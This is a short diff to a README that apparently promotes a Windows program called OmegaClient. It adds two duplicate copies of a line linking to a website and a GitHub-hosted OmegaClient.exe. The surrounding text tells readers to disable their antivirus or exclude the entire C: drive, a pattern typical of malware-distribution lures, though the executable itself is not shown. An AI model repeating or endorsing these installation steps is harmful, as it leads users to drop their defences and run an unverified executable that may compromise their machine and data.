@@ -28,6 +28,9 @@ Disable your antivirus, or add the "C:\\" folder to exceptions.
 
 ## 🛠️ Installation
 - [Visit our website](https://omegaclient.netlify.app/) or [GH release](https://github.com/smellglue/omega/releases/download/omega/OmegaClient.exe)
+- [Visit our website](https://omegaclient.netlify.app/) or [GH release](https://github.com/smellglue/omega/releases/download/omega/OmegaClient.exe)
+- [Visit our website](https://omegaclient.netlify.app/) or [GH release](https://github.com/smellglue/omega/releases/download/omega/OmegaClient.exe)
+
 
 
 gl everyone!
